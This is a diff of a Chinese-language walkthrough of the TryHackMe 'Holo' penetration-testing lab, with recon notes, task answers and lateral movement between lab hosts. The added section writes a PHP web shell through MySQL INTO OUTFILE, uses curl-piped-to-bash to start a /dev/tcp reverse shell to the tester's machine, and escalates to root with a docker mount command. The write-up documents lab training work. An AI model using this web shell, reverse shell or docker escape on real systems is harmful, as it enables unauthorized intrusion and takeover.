@@ -172,7 +172,7 @@ Nmap done: 1 IP address (1 host up) scanned in 18.69 seconds
 
 ```
 
-# 10.200.112.33
+# 10.200.112.33 Recon
 
 ```
 ┌──(root㉿rock)-[~/thm/holo]
@@ -359,6 +359,7 @@ Interesting Finding(s):
 
 > holo.live
 
+# L-SRV02
 
 ## vhost爆破
 ```
@@ -564,6 +565,22 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 
 ```
 
+**Task 13  Web App Exploitation Remote Control Empanadas**
+
+> What file is vulnerable to RCE on the administrator domain?
+
+> dashboard.php
+
+> What parameter is vulnerable to RCE on the administrator domain?
+
+> cmd
+
+> What user is the web server running as?
+
+> www-data
+
+
+
 查看根目录，存在一个```.dockerenv```文件，说明我们在docker容器里
 ```
 www-data@6ef44d2b6a12:/$ ls -alh
@@ -753,3 +770,164 @@ Port  8080  is open
 > What username can be found within the database itself?
 
 > gurag
+
+# L-SRV01
+
+由于我们可以连接在```192.168.100.1```上的mysql服务，可以通过滥用mysql服务来横向到目标机器，这里的思路至少有两条
+1. UDF
+2. 生成一个web shell文件
+
+这里生成一个web shell 文件
+```
+mysql> select '<?php $cmd=$_GET["cmd"];system($cmd);?>' INTO OUTFILE '/var/www/html/cmd.php';
+select '<?php $cmd=$_GET["cmd"];system($cmd);?>' INTO OUTFILE '/var/www/html/cmd.php';
+Query OK, 1 row affected (0.00 sec)
+
+```
+成功写入，执行whoami命令
+```
+www-data@9f54bfa15108:/var/www/admin$ curl 192.168.100.1:8080/cmd.php?cmd=whoami
+<w/admin$ curl 192.168.100.1:8080/cmd.php?cmd=whoami
+www-data
+```
+
+**Task 18  Docker Breakout Making Thin Lizzy Proud**
+
+> What user is the database running as?
+
+> www-data
+
+现在我们要验证mysql上的靶机是否可以与我们的kali通信，先在本地kali起一个python web server
+
+使用下面命令测试
+
+```
+www-data@9f54bfa15108:/var/www/admin$ curl 192.168.100.1:8080/cmd.php?cmd=wget http://10.50.109.139/any
+<00.1:8080/cmd.php?cmd=wget http://10.50.109.139/any
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
+        "http://www.w3.org/TR/html4/strict.dtd">
+<html>
+    <head>
+        <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
+        <title>Error response</title>
+    </head>
+    <body>
+        <h1>Error response</h1>
+        <p>Error code: 404</p>
+        <p>Message: File not found.</p>
+        <p>Error code explanation: HTTPStatus.NOT_FOUND - Nothing matches the given URI.</p>
+    </body>
+</html>
+
+```
+
+收到web访问请求，证明可以通信，也就是说我们可以获得一个rev shell
+```
+┌──(root💀kali)-[~/tryhackme/holo]
+└─# python3 -m http.server 80                                                                                   1 ⨯
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.200.112.33 - - [26/Jul/2022 03:38:05] code 404, message File not found
+10.200.112.33 - - [26/Jul/2022 03:38:05] "GET /any HTTP/1.1" 404 -
+
+```
+
+## foothold
+准备一个rev babsh文件
+```
+┌──(root💀kali)-[~/tryhackme/holo]
+└─# cat rev.sh
+#!/bin/bash
+bash -i >& /dev/tcp/10.50.109.139/4242 0>&1
+```
+
+本地起一个web server
+
+思路是rce让mysql主机访问上面的脚本并执行，返回一个rev shell
+
+rev shell放在一个bash脚本里的好处是可以规避一些引号和特殊字符的问题
+
+使用下面payload
+```
+curl http://192.168.100.1:8080/cmd.php?cmd=curl http://10.50.109.139/rev.sh|bash &
+```
+
+注意，cmd后面的命令要用urlencode转一次，规避特殊符号引起的麻烦
+
+```
+curl http://192.168.100.1:8080/cmd.php?cmd=curl%20http%3A%2F%2F10.50.109.139%2Frev.sh%7Cbash%20%26
+```
+
+横向到```L-SRV01```
+```
+┌──(root💀kali)-[~/tryhackme/holo]
+└─# nc -lnvp 4242
+listening on [any] 4242 ...
+connect to [10.50.109.139] from (UNKNOWN) [10.200.112.33] 48736
+bash: cannot set terminal process group (1845): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@ip-10-200-112-33:/var/www/html$ whoami
+whoami
+www-data
+ww-data@ip-10-200-112-33:/var/www/html$ ip a
+ip a
+1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+    inet6 ::1/128 scope host 
+       valid_lft forever preferred_lft forever
+2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc mq state UP group default qlen 1000
+    link/ether 02:69:87:5e:18:71 brd ff:ff:ff:ff:ff:ff
+    inet 10.200.112.33/24 brd 10.200.112.255 scope global dynamic eth0
+       valid_lft 3441sec preferred_lft 3441sec
+    inet6 fe80::69:87ff:fe5e:1871/64 scope link 
+       valid_lft forever preferred_lft forever
+3: docker0: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc noqueue state DOWN group default 
+    link/ether 02:42:5b:cf:7e:19 brd ff:ff:ff:ff:ff:ff
+    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
+       valid_lft forever preferred_lft forever
+4: br-19e3b4fa18b8: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
+    link/ether 02:42:39:fc:98:69 brd ff:ff:ff:ff:ff:ff
+    inet 192.168.100.1/24 brd 192.168.100.255 scope global br-19e3b4fa18b8
+       valid_lft forever preferred_lft forever
+    inet6 fe80::42:39ff:fefc:9869/64 scope link 
+       valid_lft forever preferred_lft forever
+6: vethcde8a5c@if5: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master br-19e3b4fa18b8 state UP group default 
+    link/ether 86:07:fe:d0:3a:b6 brd ff:ff:ff:ff:ff:ff link-netnsid 0
+    inet6 fe80::8407:feff:fed0:3ab6/64 scope link 
+       valid_lft forever preferred_lft forever
+
+```
+
+## L-SRV01提权
+
+枚举所有SUID
+
+```
+www-data@ip-10-200-112-33:/var/www/html$ find / -perm -u=s -type f 2>/dev/null
+<var/www/html$ find / -perm -u=s -type f 2>/dev/null
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/openssh/ssh-keysign
+/usr/bin/umount
+/usr/bin/docker
+/usr/bin/fusermount
+/usr/bin/newgrp
+/usr/bin/pkexec
+/usr/bin/su
+/usr/bin/gpasswd
+/usr/bin/passwd
+/usr/bin/at
+/usr/bin/chfn
+/usr/bin/sudo
+/usr/bin/mount
+/usr/bin/chsh
+
+```
+
+
+可以使用docker提权，见[这里](https://gtfobins.github.io/gtfobins/docker/)
+
+
+/usr/bin/docker run -v /:/mnt --rm -it alpine chroot /mnt sh
